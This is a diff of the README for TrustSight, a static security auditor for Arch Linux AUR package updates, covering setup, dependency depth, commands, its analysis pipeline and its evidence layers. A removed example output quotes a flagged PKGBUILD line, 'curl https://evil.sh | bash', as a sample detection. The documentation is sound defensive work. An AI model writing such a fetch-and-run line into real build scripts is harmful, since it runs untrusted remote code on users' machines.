@@ -26,6 +26,10 @@ Audits AUR PKGBUILD updates before you install: detects structural changes, susp
 
 ---
 
+## What is TrustSight
+
+TrustSight is a **static security auditing tool** for Arch Linux’s AUR that analyzes package updates across the `PKGBUILD`, `.SRCINFO`, `.install` hooks, Makefiles, and other committed repository files. It **combines** pattern matching, behavioral heuristics, structural checks, dependency analysis, sabotage detection, and cross-file correlation to flag suspicious commands, obfuscation, risky installation behavior, source URL and checksum changes, dependency anomalies, maintainer changes, and previously unseen sources. It compares versions and repository history, producing evidence-linked findings and a deterministic report. TrustSight does not execute build scripts, fetch declared package sources, or inspect downloaded archives, so a clean result cannot guarantee safety.
+
 ## Setup
 
 > **TrustSight is available on the AUR, maintained by this project.** The `trustsight` AUR package is built from `packaging/aur/PKGBUILD` in this repository. It gets no special trust for being the author's: it is an AUR package like any other, so inspect its PKGBUILD before installing. Source remains the recommended install, below.
@@ -42,13 +46,13 @@ makepkg -si
 
 # 2. Scan your outdated AUR packages
 trustsight review
+
+# 3. Scan a package before install
+trustsight inspect PACKAGE_NAME --allow-uninstalled --full-recipe
 ```
 
 Requires **Python 3.11+** and **Arch Linux** (the tool discovers packages via `pacman -Qm`, `pacman -Sl` for local repos, or `--repo`/`--all-repos` flags).
 
-The analysis is deterministic and calculated locally. Verdicts are template-based, describing each finding in plain English, for example `"Version bump. modified PKGBUILD, .SRCINFO. Signals: checksum disabled; novel dependency 'pyfoo' added in depends."` Runs are read-only by default; `--record` opts into persisting observations and analysis history.
-
-Baselines ship as signed GitHub release assets (`baseline-seed.tar.gz`, IOC baselines, the corpus). On an eligible first `review` or `inspect`, the CLI downloads the novelty seed and imports it only after its ed25519 signature verifies against the pinned distribution key; when offline, the attempt is skipped silently and the run starts cold. Other commands do not fetch it automatically. See [installation](https://docs.trustsight.org/tutorial/installation/) for details.
 
 ---
 
@@ -97,161 +101,17 @@ The default review output shows findings and a verdict, not score or risk column
 
 ---
 
-## Dependency depth
-
-An AUR package's `depends` and `makedepends` can name other AUR packages, and
-`makepkg` builds those on your machine in the same run. Reviewing only the
-package you typed reads one recipe out of several that will actually execute -
-and a hijacked orphan is far more often somebody's dependency than the thing
-you meant to install.
-
-So AUR dependencies are analysed by default.
-
-| Depth | Behaviour |
-|---|---|
-| `0` | Dependencies are not analysed. |
-| `1` | Direct AUR dependencies. **The default.** |
-| `n` | `n` levels. |
-| `-1` | Every level there is, up to the hard ceilings below. |
-
-```bash
-trustsight inspect some-pkg              # depth 1, the default
-trustsight inspect some-pkg --depth 0    # this package only
-trustsight inspect some-pkg --depth 3    # three levels
-trustsight review --depth -1             # the whole closure
-trustsight review --deps                 # dependencies as the report subjects
-trustsight review --deps --depth 2       # direct dependencies and theirs
-```
-
-Set it permanently in `config.toml`:
-
-```toml
-[depth]
-levels = 1
-```
-
-Three things worth knowing:
-
-**Each dependency is analysed as a package**, not as a component of one. It
-gets its own score, its own band, its own coverage gaps and its own row in the
-database, and it renders as a mini-card nested inside the parent's card.
-Nothing is folded into the parent's score - `depth` is deliberately not part of
-the config fingerprint, so a score that moved when you passed `--depth` would
-make two operators' results incomparable.
-
-**`-1` is bounded.** The dependency graph is written by the party under review:
-a recipe declaring five hundred AUR `makedepends`, each declaring five hundred
-more, would otherwise decide how many repositories your machine clones. The
-ceilings are 8 levels and 200 dependencies per run.
-
-**A walk cut short says so.** Hitting a ceiling, or failing to analyse a
-dependency, records the `deps_not_scanned` coverage gap, which forbids an
-UNFLAGGED result. A walk that *completed* is not a gap: asking for depth 1 and
-getting depth 1 is a complete answer to the question you asked.
-
-Dependencies are read from the corpus metadata snapshot when you have one (no
-extra network), otherwise from one batched AUR RPC request per level. Only
-`depends`, `makedepends` and `checkdepends` count - `optdepends` is not
-installed by default. The first run clones each dependency; later runs reuse
-the cache.
-
----
-
-## The 30-second example
-
-```bash
-trustsight review
-```
-
-```
-╭────────────────────────── chez-scheme-bin ───────────────────────────╮
-│  Version  10.0.0  →  10.1.0                                          │
-│  Status   Only pkgver and sha256sums changed. Review the diff        │
-│           before building.                                           │
-│  Changed  pkgver 10.0.0 -> 10.1.0                                    │
-│           checksums added or changed                                 │
-╰──────────────────────────────────────────────────────────────────────╯
-╭──────────────────────────── sketchy-pkg ─────────────────────────────╮
-│  Version  1.4.2  →  1.5.0                                            │
-│  Status   The update is not trivial. Review it.                      │
-│           PKGBUILD line 4  Remote Script Execution: curl             │
-│           https://evil.sh | bash [R001]                              │
-│           Source URL classified as unknown (https://evil.sh)         │
-│           [SOURCE_BUCKET]                                            │
-│  Changed  pkgver 1.4.2 -> 1.5.0                                      │
-│           source host added: evil.sh                                 │
-╰──────────────────────────────────────────────────────────────────────╯
-2 package(s) needing update and reviewed out of 2 installed
-```
-
-One panel per package, and every signal is shown with the file, line and rule
-that produced it. You see **why** the update needs review.
-
-The default is evidence-first. Add `--score` to show the numeric score and
-band, or `--risk` for the band alone.
-
----
-
-## Commands
-
-| Command | What it does |
-|---|---|
-| [`trustsight review`](https://docs.trustsight.org/reference/cli/#trustsight-review) | Scan outdated AUR packages and produce a findings table with tiered evidence. Supports `--repo`, `--foreign`, `--all-repos`, `--verbose`, `--depth` flags. |
-| [`trustsight inspect <package>`](https://docs.trustsight.org/reference/cli/#trustsight-inspect-package) | Deep-dive on a single package: findings, source URLs, resolved commands, novelty context, and its AUR dependencies (`--depth`). |
-| [`trustsight history <package>`](https://docs.trustsight.org/reference/cli/#trustsight-history-package) | Show past analysis results for a package. |
-| [`trustsight forget <package>`](https://docs.trustsight.org/reference/cli/#trustsight-forget-package) | Remove a tracked package and all its history, or prune packages that no longer exist in the AUR (`--prune`). |
-| [`trustsight list`](https://docs.trustsight.org/reference/cli/#trustsight-list) | List all packages tracked in the database. |
-| [`trustsight status`](https://docs.trustsight.org/reference/cli/#trustsight-status) | Show database and system health statistics. |
-| [`trustsight config`](https://docs.trustsight.org/reference/cli/#trustsight-config) | Manage configuration (`show`, `set`, `sync-rules`). |
-| [`trustsight seed-db`](https://docs.trustsight.org/reference/cli/#trustsight-seed-db) | Import a novelty seed (`.db`, `.db.gz`, or a v2 `.tar.gz`). The release-channel seed imports automatically on first review. |
-| [`trustsight seed`](https://docs.trustsight.org/reference/cli/#trustsight-seed) | Inspect the hashed maintainer seed, fetch the verified release-channel seed, or migrate legacy plaintext rows. |
-| [`trustsight db`](https://docs.trustsight.org/reference/cli/#trustsight-db) | Database maintenance (`check`, `vacuum`, `backup`). |
-| [`trustsight override`](https://docs.trustsight.org/reference/cli/#trustsight-override) | Suppress a rule that misfires on your packages. |
-| [`trustsight lint-rules`](https://docs.trustsight.org/reference/cli/#trustsight-lint-rules) | Check `rules.toml` for unreachable or malformed rules. |
-| [`trustsight full-aur`](https://docs.trustsight.org/reference/cli/#trustsight-full-aur) | Bootstrap or update the full-AUR baseline corpus; `--watch` runs repeated cycles on an interval. |
-| [`trustsight baseline`](https://docs.trustsight.org/reference/cli/#trustsight-baseline) | Build or import a full-AUR baseline artifact, optionally signed with your key. |
-| [`trustsight import-baseline`](https://docs.trustsight.org/reference/cli/#trustsight-import-baseline) | Verify and import a signed baseline artifact. |
-| [`trustsight ioc`](https://docs.trustsight.org/reference/cli/#trustsight-ioc) | Manage IOC federation baselines (`update`, `list`, `export`, `sources`). |
-| [`trustsight corpus`](https://docs.trustsight.org/reference/cli/#trustsight-corpus) | Corpus-wide queries over the full-AUR baseline (`pivot`, `import`, `export`). |
-
----
-
-## Use it from Python
-
-Every flow above is available as a library through [`trustsight.api`](https://docs.trustsight.org/reference/python-api/), which returns dataclasses instead of printing. Nothing else under `trustsight.` is public.
-
-```python
-from trustsight import TrustSight
-
-ts = TrustSight()
-
-report = ts.inspect("some-package")
-print(report.risk_label, report.verdict)
-
-result = ts.review(limit=25)
-for r in result.flagged:
-    print(r.package, r.risk, r.verdict)
-for failure in result.failures:
-    print("NOT VETTED:", failure.package, failure.error)
-
-for cycle in ts.watch(interval=1800):     # full-aur --watch, as a generator
-    for package, rule_id in cycle.new_alerts:
-        print(rule_id, package)
-```
-
-Two rules carry over from the CLI. Use `report.risk`, never a band re-derived from `report.score`: an analysis that could not read the whole change reports `Inconclusive` regardless of the number. And check `result.failures`, because a package that could not be analysed is a result, not an absence. `result.to_dict()` follows `review --json`: it is one flat list containing successful report rows and failed rows marked `failed: true`.
-
----
-
 ## How it works
 
 A run is deterministic: the same diff, effective configuration, and stored observation history always produce the same evidence record. The pipeline is:
 
-1. **Diff** the old and new PKGBUILD
-2. **Apply rules** to detect structural changes, suspicious commands, typosquatting, etc.
-3. **Classify URLs** into trust buckets (trusted forge, official, raw hosting, unknown, homograph)
-4. **Check novelty** against the local database of known URLs and maintainers
-5. **Report** the findings, the change summary, and any coverage gaps
+1. **Diff** the old and new PKGBUILD, then read the post-patch end state
+2. **Resolve** variable references in `source`, `sha256sums`, `pkgver`, `pkgrel`, and `package()`; anything not statically resolvable becomes a coverage gap
+3. **Apply rules** for structural changes, suspicious commands, typosquatting, evasion and hidden text, install-script and persistence behaviour, and the `U`-series upstream manifests
+4. **Classify URLs** into trust buckets (trusted forge, official, raw hosting, unknown, homograph)
+5. **Check novelty** against the local database of known URLs and maintainers, and follow the AUR dependency closure to its configured depth
+6. **Read declared verification**; checksums, PGP keys, signature sources, and commit/tag pins are reported at weight 0
+7. **Report** the findings, the change summary, and any coverage gaps
 
 Verdicts are template-based, describing each triggered finding in plain English. All output is deterministic and generated locally.
 
@@ -261,20 +121,16 @@ Every rule carries an **evidence layer**, `L1`-`L8`, naming the *kind* of eviden
 
 | Layer | The question its evidence answers | Rule families |
 |---|---|---|
-| `L1` Structural coherence | Does the change hang together as an honest edit? | `C`, `M` |
+| `L1` Structural coherence | Does the change hang together as an honest edit? | `C`, `P` |
 | `L2` Readability | Was anything hidden from the reader? | `W`, and the refusal rules `X026`/`X027` |
-| `L3` Payload signature | Does it do a known-bad thing? | `R`, `S` |
+| `L3` Payload signature | Does it do a known-bad thing? | `R`, `S`, `U` |
 | `L4` Evasion shape | Was it *written* to defeat reading? | `X`, `E` |
 | `L5` Behavioral suspicion | Does the package's story make sense? | `H` |
 | `L6` Ecosystem memory | Has the ecosystem seen this before? | `D`, `T` |
 | `L7` Known indicators | Is it on the list? | `I` |
 | `L8` Campaign correlation | Do other packages tell the same story? | `G` |
 
-The report keeps detection and coverage separate: `L3 fired` says the payload-signature check matched, `L1 passed` says the structural check was read in full and stayed silent (not that the update is safe), and `L8 not_applicable` says the check could not run on a single package. The optional `L9` build lane (`A001`-`A008`) inspects the built package and is not one of the eight. See [How TrustSight groups security evidence](https://docs.trustsight.org/assurance-layers/).
-
-### The score, on request
-
-A weighted score is computed on every run but is not part of the default output; ask for it with `--score` (`--risk` for the band). It is a heuristic aggregate of the fired findings - not a probability of compromise, not a confidence, and not a prediction. A score of 40 does not mean "40% likely to be malicious"; it means the findings that fired carry that combined weight. See [How TrustSight Works](https://docs.trustsight.org/explanation/) and the [scoring philosophy](https://docs.trustsight.org/explanation/scoring-philosophy/).
+The report keeps detection and coverage separate: `L3 fired` says the payload-signature check matched, `L1 passed` says the structural check was read in full and stayed silent (not that the update is safe), and `L8 not_applicable` says the check could not run on a single package. `M` reasons about other findings and fires *at* their layer, so it owns no layer of its own. The optional `L9` build lane (`A001`-`A008`) inspects the built package and is not one of the eight. See [How TrustSight groups security evidence](https://docs.trustsight.org/assurance-layers/).
 
 Signals come from 242 documented rules across eleven rule families: 37 detection rules (R-series, TOML-configurable), 103 heuristic rules (H-series), 32 code-structure rules (C001-C032), 4 dependency-graph rules (D001-D004), 8 sabotage rules (S001-S008), 34 crossfire anti-evasion rules (X001-X034), 5 meta rules (M001-M005), 3 entropy rules (E001-E003), 3 temporal rules (T001-T003), 7 correlation rules (G001-G007), and 6 manifest rules (U001-U006). Two further families are reported but never weighted: declared practice (P001-P008) and unverifiable (W001-W010), the latter naming what an analysis could not read. The optional L9 build lane adds eight artifact rules (A001-A008), reported outside the heuristic when enabled. Calibration uses a locked, point-in-time 3,739-diff benign corpus of real AUR updates and 207 self-authored, labelled malicious fixtures; it is regression evidence, not an independent recall claim. See [Benchmarks and Methodology](https://docs.trustsight.org/explanation/benchmarks-and-methodology/) and the [blinded-evaluation intake](https://docs.trustsight.org/contributing/blinded-evaluation/) for scope.
 
